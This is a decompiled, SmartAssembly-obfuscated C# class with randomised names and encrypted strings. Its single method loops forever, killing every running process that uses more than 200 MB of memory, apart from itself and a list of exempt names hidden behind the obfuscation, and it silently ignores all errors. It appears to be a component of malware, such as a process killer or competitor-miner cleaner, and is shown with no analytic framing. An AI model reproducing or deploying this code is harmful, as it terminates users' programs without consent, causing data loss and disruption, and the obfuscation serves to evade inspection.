using System;
using System.Diagnostics;
using System.Threading;
using SmartAssembly.Delegates;
using SmartAssembly.HouseOfCards;

namespace bmDbQpaZORfnY;

public static class DidmuRTNrmknEsJB
{
	[NonSerialized]
	internal static GetString getString_0;

	public static void nTaIMASTvbcco()
	{
		while (true)
		{
			Process[] processes = Process.GetProcesses();
			foreach (Process process in processes)
			{
				try
				{
					if (process.PrivateMemorySize64 > 209715200L && process.ProcessName != Process.GetCurrentProcess().ProcessName && !process.ProcessName.Contains(getString_0(107401032)) && !process.ProcessName.Contains(getString_0(107400991)) && !process.ProcessName.Contains(getString_0(107400982)) && !process.ProcessName.Contains(getString_0(107401005)) && !process.ProcessName.Contains(getString_0(107400960)) && !process.ProcessName.Contains(getString_0(107400979)) && !process.ProcessName.Contains(getString_0(107400966)) && !process.ProcessName.Contains(getString_0(107400921)) && !process.ProcessName.Contains(getString_0(107400940)) && !process.ProcessName.Contains(getString_0(107400895)) && !process.ProcessName.Contains(getString_0(107400906)))
					{
						process.Kill();
					}
				}
				catch
				{
				}
			}
			try
			{
				Thread.Sleep(2500);
			}
			catch
			{
			}
		}
	}

	static DidmuRTNrmknEsJB()
	{
		Strings.CreateGetStringDelegate(typeof(DidmuRTNrmknEsJB));
	}
}
